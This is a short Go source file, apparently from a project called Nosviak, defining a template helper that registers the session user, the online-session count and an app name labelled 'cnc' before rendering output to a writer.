package views

import (
	"Nosviak/core/masters/sessions"
	"io"
	"strconv"
	
	"Nosviak/core/models/configs/toml"
)

//template which will register most of the variables automatically
//this will register most variables for us meaning we won't need to in the funciton
//keeping the code much cleaner to read in the main files
//this will completetly execute the file aswell
func (i *DtxFormat) Template(session *sessions.Session, wr io.Writer) (error) {


	//registers the information into the structure
	//we will also save into the main structural information
	i = i.RegisterStructure("user", *session.User)

	//registers the information into the variable map
	i = i.RegisterVariable("online", strconv.Itoa(len(sessions.Sessions)))

	i.RegisterVariable("cnc", Toml.InstanceToml.Default.AppName)
	

	//executes the entire structure correctly once fields are filled in
	return i.ExecuteStandard(wr)
}